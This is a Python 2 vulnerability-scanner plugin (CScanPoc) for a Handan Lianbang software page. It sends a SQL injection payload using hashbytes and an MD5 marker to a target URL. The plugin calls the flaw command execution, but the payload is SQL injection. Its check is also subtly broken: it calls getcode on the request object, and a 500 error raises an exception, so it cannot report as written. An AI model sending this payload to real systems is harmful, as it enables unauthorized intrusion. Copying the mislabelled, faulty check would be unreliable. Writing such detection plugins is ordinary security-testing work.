# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import urllib2

class Vuln(ABVuln):
    vuln_id = 'lianbangsoft_0003' # 平台漏洞编号，留空
    name = '邯郸市连邦软件 命令执行'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.RCE # 漏洞类型
    disclosure_date = ''  # 漏洞公布时间
    desc = '''
        邯郸市连邦软件 workplate/xzsp/gxxt/tjfx/dtl.aspx 页面过滤不严谨，导致命令执行漏洞。
    '''  # 漏洞描述
    ref = ''  # 漏洞来源
    cnvd_id = ''  # cnvd漏洞编号
    cve_id = ''  # cve编号
    product = '邯郸市连邦软件'  # 漏洞应用名称
    product_version = ''  # 漏洞应用版本

class Poc(ABPoc):
    poc_id = '3d2225ab-7fe1-4701-9fa0-a371e3f7261f'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-16'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            
            payload = "/workplate/xzsp/gxxt/tjfx/dtl.aspx?id=76001&refnum=137&baseorg=209&flag=''&xksx=928+AND+1=sys.fn_varbintohexstr(hashbytes('MD5','1234'))-- "
            verify_url = self.target + payload
            req = urllib2.Request(verify_url)
            content = urllib2.urlopen(req).read()

            if req.getcode() == 500 and '81dc9bdb52d04dc20036dbd8313ed055' in content:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        super(Poc, self).exploit()

if __name__ == '__main__':
    Poc().run()
